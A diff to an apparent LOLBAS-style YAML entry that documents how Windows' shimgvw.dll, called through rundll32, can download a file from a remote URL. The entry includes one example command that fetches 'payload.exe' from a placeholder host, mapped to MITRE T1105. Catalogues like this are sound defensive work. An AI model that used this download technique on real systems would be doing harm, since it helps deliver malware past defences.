@@ -5,12 +5,14 @@ Author: Eral4m
 Created: 2021-01-06
 Commands:
   - Command: rundll32.exe c:\Windows\System32\shimgvw.dll,ImageView_Fullscreen http://x.x.x.x/payload.exe
-    Description: Once executed, rundll32.exe will download the file at the URL in the command to %LOCALAPPDATA%\Microsoft\Windows\INetCache\IE\<random>\payload[1].exe. Can also be used with entrypoint 'ImageView_FullscreenA'.
+    Description: Once executed, rundll32.exe will download the file at the URL in the command to INetCache. Can also be used with entrypoint 'ImageView_FullscreenA'.
     Usecase: Download file from remote location.
     Category: Download
     Privileges: User
     MitreID: T1105
     OperatingSystem: Windows 10, Windows 11
+    Tags:
+      - Download: INetCache
 Full_Path:
   - Path: c:\windows\system32\shimgvw.dll
   - Path: c:\windows\syswow64\shimgvw.dll
